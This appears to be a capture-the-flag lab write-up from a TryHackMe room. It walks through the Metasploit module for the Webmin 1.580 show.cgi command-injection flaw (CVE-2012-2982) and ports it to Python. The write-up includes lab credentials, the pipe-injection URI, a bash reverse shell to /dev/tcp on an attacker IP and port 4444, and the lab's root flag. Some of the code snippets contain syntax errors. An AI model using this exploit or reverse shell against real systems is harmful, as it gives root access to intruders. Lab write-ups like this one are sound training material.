@@ -1,0 +1,238 @@
+IP : 10.10.84.100
+
+
+Methodologies
+
+As this room uses one isolated example, we cannot apply the knowledge used here to every script we write. However, as you practice this concept more, you will begin to notice patterns and generalities that can be applied more broadly. A handful of common methodologies I've found thus far include:
+
+    Optimize the script and condense unnecessary code: keep it simple stupid
+    Read and reread PoC code before researching: assists in identifying errors in scripts and how to fix them, sometimes before they occur
+    Research as detailed as possible: not all essential information is found on documentation and stackoverflow
+    Prepare to adapt and customize: PoC code sometimes uses pre-made libraries with specific functions you'll need to personally craft
+    Test segments of code along the way: this makes it easier to pinpoint potential issues
+
+Credentials
+
+username: user1
+password: 1user
+
+System Hostname : dummybox
+Operating system : Ubuntu Linux 18.04.5
+Webmin Version : 1.580
+Time on system : Sat Sep 5 23:41:12 2020
+
+Lets use searchsploit for known exploits : 
+
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)              | unix/remote/21851.rb
+Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                      | linux/webapps/47330.rb
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+We found a metasploit exploit.
+
+Lets get the exploit.
+
+┌──(kali㉿kali)-[~/TryHackMe/POCScripting]
+└─$ searchsploit -m 21851    
+  Exploit: Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)
+      URL: https://www.exploit-db.com/exploits/21851
+     Path: /usr/share/exploitdb/exploits/unix/remote/21851.rb
+File Type: Ruby script, ASCII text, with CRLF line terminators
+
+Copied to: /home/kali/TryHackMe/POCScripting/21851.rb
+
+We'll be using metasploit's code repository as a starting point, this module to be exact. 
+https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/webmin_show_cgi_exec.rb
+The module exploits an arbitrary command execution vulnerability in Webmin 1.580, CVE-2012-2982. The vulnerability exists in the /file/show.cgi component and allows an authenticated user, with access to the File Manager Module, to execute arbitrary commands with root privileges.
+
+----------------------------------------------------------------------------------------------------------------------------------------------------
+
+Lets look at the documentation on MITRE :
+
+CVE-2012-2982 :
+
+file/show.cgi in Webmin 1.590 and earlier allows remote authenticated users to execute arbitrary commands via an invalid character in a pathname, as demonstrated by a | (pipe) character. 
+
+
+
+Understanding the vulnerability
+
+CVE documentation provides resources that can better highlight and demonstrate the source of vulnerabilities. In open source software, developers keep public track of bugs their platforms and systems produce, usually on github. 
+For this particular exploit, the before and after of the bug that led to CVE-2012-2982 is documented on github, the vulnerability and how it was fixed.
+
+https://github.com/webmin/webmin/commit/1f1411fe7404ec3ac03e803cfa7e01515e71a213
+
+Here we can see a section of /file/show.cgi as it exists in Webmin versions 1.590 and earlier. The highlighted red text indicates the vulnerability while the green indicates the patch. The < operator was introduced to sanitize 
+input of invalid characters, as demonstrated by view_epathinfo. As we know from the description, this input invalidation enables us to open any file we want.
+
+This is a very small but vital piece of information to know before analyzing the metasploit module, it gives us a clear picture of what we are taking advantage of and what to strive towards while analyzing the code.
+
+
+Now lets analyse the ruby source code : 
+
+Visiting references we found that it was discovered on : September 5, 2012
+
+The Sorce code has three section:
+
+	Initialize
+	Check
+	Exploit
+
+
+Initialise : Hadling initialisation in metasploit and setting options required for the exploit.
+
+There are a few simple parameters to take note of the update_info function that we might need to consider converting
+
+    Space = 512 - maximum space in memory to store the payload
+
+    PayloadType = cmd - ensures that the payload the exploit uses is the cmd
+
+And the register_options function
+
+    RPORT(10000) - sets the target port
+
+    'SSL', [true, 'Use SSL', true] - whether or not the site uses HTTPS (this didnt so set to false)
+
+    'USERNAME', [true, 'Webmin Username'] - accepts the username
+
+    'PASSWORD', [true, 'Webmin Password'] - accepts the password
+
+
+Information to convert
+
+    payload type: cmd or the system shell
+    placeholder for the username and password
+    RPORT: the website is on the default HTTP port 80 instead of 10000
+
+
+
+Check : Check if the target is exploitable by verifying the credentials.
+
+	Check Process :
+
+		Authentication:
+
+			URL : /session_login.cgi
+			Method : POST
+			Data being sent : page=/&user=#{datastore['USERNAME']}&pass=#{datastore['PASSWORD']}
+			Cookie : 'testing=1'
+
+		Expected response : 
+		
+			Response Code : 302
+			Response.header['set-cookie'] : =~ /sid/
+
+		Set Session Id :
+
+			session = response.headers['Set-Cookie'].split("sid=")[1].split(";")[0] 
+			Means set session = xxxxxxx from the set cookie header sid=xxxxxxx;yyyyy
+
+
+		
+		Check for Exploit : 
+
+			Command = "echo #{rand_text_alphanumeric(rand(5) + 5)}"
+			Path : /file/show.cgi/bin/
+			Complete URI : /file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|
+			Cookie : "sid=#{session}"
+
+			First part is gnerating random invalid characters and second part is executing the same function with varried input generated by expression "rand(5) + 5"
+		
+		Expected response : 200
+		Response Message :  /Document follows/
+		
+
+Exploit :
+
+	Everything is same except for the command, as it is encoded payload that needs to be executed.
+
+	
+The main difference in this exploit is the change of the command variable. We can see with payload.encoded that instead of merely testing if the website is vulnerable, we are sending data (the shell) over a 
+network back to our attacking machine. In order for data to be properly sent through a URL, some exploits require URL encoding. Here metasploit is using it as insurance because as we'll see in the next task, 
+in this scenario it doesn't need to be encoded manually because the payload does not break in transit.
+
+The module does not specify the type of request, therefore using the default GET method. It sends a request with the authenticated cookie to the file that houses the vulnerability show.cgi and enters the 
+invalid input, piping it with | to the malicious command, the system shell. As metasploit automatically establishes a socket connection between the target and attacker, we'll have include a line to open 
+a socket on the victim in order to send the system shell back to us. 
+
+
+Information to convert :
+
+    store the system shell with a function, encode it and send it back via socket
+    send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command 
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Conversion to Python :
+
+At this point we know exactly what information we need in order to convert this ruby code to python, lets review everything so far.
+
+Information to convert
+
+    payload type: cmd or system shell
+    the login page URI data (credentials, receiving port and login page file)
+    POST request sending the URI data
+    format the cookie
+    verify HTTP response code and the session id is not empty, print statement to verify success
+    generate five random characters
+    store the system shell with a function, encode it and send it back via socket
+    send a GET or POST request with compromised cookie for show.cgi with invalid input piping it to the malicious command 
+
+At first this module may have seemed intimidating, but as we've broken down in this task it's rather simple. All it's really doing is sending a couple POST requests. While some penetration testers may 
+want to first verify the target is vulnerable to a particular exploit, it's not always necessary if the goal is a simple and quick privilege escalation such as this example. You may sometimes find among 
+proof of concept code that it contains unnecessary weight to what could be a simple, quick script. 
+
+Lets put things together for the exploit:
+
+Initialize Payload : 
+	We can use a simple bash reverse shell : 
+		payload = f"bash -c 'exec bash -i &>/dev/tcp/{10.9.241.177}/{4444}<&1'"
+
+Login :
+	We can use python's request module for web interactions including logging in and payload delivery.
+
+	Login Data : data = {'page' : "%2F", 'user' : "user1", 'pass' : "1user"}
+	Login Url : f"http://{targetIP}/session_login.cgi"
+	
+	Trigger request : r = requests.post(url, data=data, cookies={"testing":"1"}, verify=False, allow_redirects=False)
+
+	Check for status code and if sid is set : if r.status_code == 302 and r.cookies["sid"] != None
+	
+	Get Session_ID : 
+		S_ID = r.headers('Set-Cookie').split("=")[1].split(";").strip()
+
+		cookie = r.cookies["sid"]
+		S_ID = cookie.strip("/=; ") 
+	
+Exploit
+
+Now we've reached the main event, crafting our exploit. Let's review our needs and discuss some initial ideas to implement them.
+
+    generate five random alphanumeric characters
+    store the system shell with a function, encode it and send it back via socket
+    send a GET or POST request with compromised cookie to show.cgi with invalid input piping it to the malicious command 
+
+	Payload : "bash -c 'exec bash -i &>/dev/tcp/" + l_host + "/" + str(l_port) + "<&1'"
+
+		<&1 : redirects tcp socket output stream to bash input stream
+		&> : redirect bash output stream to tcp socket input stream
+		-c : replaces current shell process	
+
+	Alpha_num_random : 
+		def random_alpha_num():
+			alpha_num = string.ascii_letters + string.digits
+			rand_str = "".join(secrets.choice(alpha_num) for i in range(5))
+			return rand_str
+	Exploit_Url : exploit_url = "http://" + TARGET_IP + "/file/show.cgi/bin/" + random_alpha_num() + "|" + payload + "|"
+	
+	Requese : requests.post(exploit_url, cookies={"sid":session_id}, verify=False, allow_redirects=False)
+
+Final code in exploit.py
+
+Root flag : THM{ur_So_1337!@#$}
+
+!!!
